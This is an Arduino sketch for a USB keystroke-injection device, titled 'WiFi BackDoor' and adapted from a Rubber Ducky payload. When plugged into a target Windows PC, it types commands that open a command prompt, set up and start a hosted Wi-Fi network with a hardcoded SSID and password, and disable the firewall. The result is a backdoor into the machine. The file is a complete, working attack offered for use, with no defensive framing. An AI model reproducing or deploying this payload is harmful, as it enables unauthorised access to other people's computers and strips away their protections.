//WiFi BackDoor

/*
This code opens up command prompt and creates a network that the target PC hosts, 
which can be accessed using the SSID and password in the code below. 
Feel free to change the SSID and password to whatever you would like.
To stop the hosted network, go into cmd and run the command "NETSH WLAN stop hostednetwork".
I had to change some commands to get it to work properly, but it works now!
The original file can be found here: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---wifi-backdoor
*/

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("netsh wlan set hostednetwork mode=allow ssid=noobcake key=12345678");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("netsh wlan start hostednetwork");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("netsh firewall set opmode disable");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
